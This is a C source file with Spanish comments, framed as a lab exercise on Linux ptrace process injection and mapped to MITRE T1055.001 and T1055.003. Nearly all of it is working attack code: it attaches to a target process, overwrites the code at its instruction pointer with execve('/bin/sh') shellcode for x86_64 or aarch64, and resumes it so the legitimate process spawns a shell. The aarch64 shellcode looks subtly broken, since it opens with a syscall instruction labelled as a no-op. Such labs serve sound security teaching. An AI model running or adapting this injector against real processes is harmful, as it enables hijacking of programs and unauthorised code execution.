/*
 * ============================================================
 * LABORATORIO 1: Ptrace Injection (Multi-Arquitectura)
 * ============================================================
 * Equivalente en Linux a:
 *   - T1055.001 (Classic DLL Injection / WriteProcessMemory)
 *   - T1055.003 (Thread Execution Hijacking / SetThreadContext)
 *
 * Soporta compilación en:
 *   - x86_64 (Intel/AMD)
 *   - aarch64 (ARM64 / Apple Silicon via Docker)
 * ============================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <stdint.h>
#include <elf.h>
#include <errno.h>

#if defined(__x86_64__)
    #include <sys/user.h>
    /*
     * Shellcode x86_64: execve("/bin/sh", NULL, NULL)
     * Este shellcode abre una shell cuando se ejecuta.
     */
    unsigned char shellcode[] =
        "\x48\x31\xf6"             /* xor rsi, rsi       */
        "\x56"                     /* push rsi            */
        "\x48\xbf\x2f\x62\x69\x6e" /* movabs rdi, ...   */
        "\x2f\x2f\x73\x68"
        "\x57"                     /* push rdi            */
        "\x54"                     /* push rsp            */
        "\x5f"                     /* pop rdi             */
        "\x6a\x3b"                 /* push 0x3b           */
        "\x58"                     /* pop rax             */
        "\x99"                     /* cdq                 */
        "\x0f\x05";               /* syscall             */

#elif defined(__aarch64__)
    /*
     * Shellcode ARM64 (aarch64): execve("/bin/sh", NULL, NULL)
     * Adaptado para procesadores ARM como Apple M1/M2/M3.
     */
    unsigned char shellcode[] =
        "\x01\x00\x00\xd4"         /* svc #0 (placeholder nop) */
        "\xe0\x03\x1f\xaa"         /* mov x0, xzr              */
        "\xe1\x03\x1f\xaa"         /* mov x1, xzr              */
        "\xe2\x03\x1f\xaa"         /* mov x2, xzr              */
        "\x60\x01\x00\x10"         /* adr x0, #0x2c            */
        "\xa8\x1b\x80\xd2"         /* mov x8, #221 (execve)    */
        "\x01\x00\x00\xd4"         /* svc #0                   */
        "\x2f\x62\x69\x6e"         /* "/bin"                   */
        "\x2f\x73\x68\x00";        /* "/sh\0"                  */
#else
    #error "Arquitectura no soportada. Usa x86_64 o aarch64."
#endif

void inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
    long word;
    int i;

    for (i = 0; i < len; i += sizeof(long)) {
        memcpy(&word, src + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, (char *)dst + i, word) < 0) {
            perror("[!] PTRACE_POKETEXT falló");
            exit(1);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <PID_del_objetivo>\n", argv[0]);
        fprintf(stderr, "\nEjemplo:\n");
        fprintf(stderr, "  Terminal 1: ./target\n");
        fprintf(stderr, "  Terminal 2: sudo ./ptrace_inject <PID>\n");
        exit(1);
    }

    pid_t target_pid = atoi(argv[1]);

    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║   LABORATORIO: Ptrace Process Injection          ║\n");
    printf("║   Equivalente a T1055.001 / T1055.003            ║\n");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    /* ─── PASO 1: Adjuntarse al proceso (equivalente a OpenProcess en Windows) ─── */
    printf("[PASO 1] Adjuntándose al proceso objetivo (PID: %d)...\n", target_pid);
    printf("         → Equivalente Windows: OpenProcess(PROCESS_ALL_ACCESS, pid)\n");
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("[!] Fallo al adjuntar. ¿Usaste sudo?");
        exit(1);
    }
    waitpid(target_pid, NULL, 0);
    printf("[+] Proceso detenido con éxito (señal SIGSTOP enviada).\n\n");

    /* ─── PASO 2: Leer registros (equivalente a GetThreadContext) ─── */
    printf("[PASO 2] Leyendo registros del proceso...\n");
    printf("         → Equivalente Windows: GetThreadContext(hThread, &ctx)\n");

    unsigned long instruction_pointer;

#if defined(__x86_64__)
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
        perror("[!] Fallo al obtener registros");
        exit(1);
    }
    instruction_pointer = regs.rip;
    printf("[+] Registro RIP (Instruction Pointer): 0x%lx\n\n", instruction_pointer);

#elif defined(__aarch64__)
    struct user_pt_regs regs;
    struct iovec iov;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    if (ptrace(PTRACE_GETREGSET, target_pid, (void*)NT_PRSTATUS, &iov) < 0) {
        perror("[!] Fallo al obtener registros (GETREGSET)");
        exit(1);
    }
    instruction_pointer = regs.pc;
    printf("[+] Registro PC (Program Counter): 0x%lx\n\n", instruction_pointer);
#endif

    /* ─── PASO 3: Inyectar shellcode (equivalente a WriteProcessMemory) ─── */
    printf("[PASO 3] Inyectando shellcode en la dirección del Instruction Pointer...\n");
    printf("         → Equivalente Windows: WriteProcessMemory(hProcess, addr, shellcode, size)\n");
    printf("         → Tamaño del shellcode: %lu bytes\n", sizeof(shellcode));
    inject_data(target_pid, shellcode, (void*)instruction_pointer, sizeof(shellcode));
    printf("[+] Shellcode escrito en memoria del proceso objetivo.\n\n");

    /* ─── PASO 4: Reanudar ejecución (equivalente a ResumeThread / CreateRemoteThread) ─── */
    printf("[PASO 4] Reanudando la ejecución del proceso...\n");
    printf("         → Equivalente Windows: ResumeThread(hThread) o CreateRemoteThread()\n");
    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0) {
        perror("[!] Fallo al desadjuntar");
        exit(1);
    }

    printf("[+] ¡INYECCIÓN COMPLETADA!\n\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║ RESULTADO:                                       ║\n");
    printf("║ El proceso legítimo ahora ejecuta nuestro        ║\n");
    printf("║ shellcode. Revisa la Terminal 1 del target.       ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");

    return 0;
}
